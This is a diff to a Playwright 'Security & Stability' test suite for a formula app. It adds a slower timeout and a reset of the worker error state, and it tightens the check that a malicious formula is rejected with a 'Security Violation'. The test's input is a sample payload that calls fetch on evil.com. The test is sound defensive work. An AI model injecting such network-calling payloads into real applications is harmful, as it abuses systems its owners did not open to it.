@@ -21,9 +21,15 @@ test.describe('Security & Stability', () => {
   });
 
   test('Sanitization: Should reject formulas containing malicious JS keywords', async ({ page }) => {
+    // 🟢 Increases timeout to 90s for this specific test
+    test.slow();
+    
     const textarea = page.locator('.HUD_Textarea');
     await textarea.waitFor({ state: 'visible' });
     
+    // [cite: 2026-01-23] FIX: Reset error state before attack to prevent race condition
+    await page.evaluate(() => { window.__lastWorkerError = null; });
+
     // Attempt to access global scope or network
     // This should trigger the Worker's security guard or Syntax Error
     const maliciousCode = 'x = u; fetch("http://evil.com");';
@@ -36,9 +42,9 @@ test.describe('Security & Stability', () => {
     // 2. Check System Invariant (Root Cause)
     // Verify the worker actually rejected it with a security violation
     await expect(async () => {
-        const error = await page.evaluate(() => window.parametricState?.error?.message || window.__lastWorkerError);
-        expect(error || "").toMatch(/Security Violation/);
-    }).toPass();
+        const error = await page.evaluate(() => window.__lastWorkerError);
+        expect(error).toMatch(/Security Violation/);
+    }).toPass({ timeout: 10000 });
   });
 
   test('Stability: Should handle Division by Zero gracefully', async ({ page }) => {
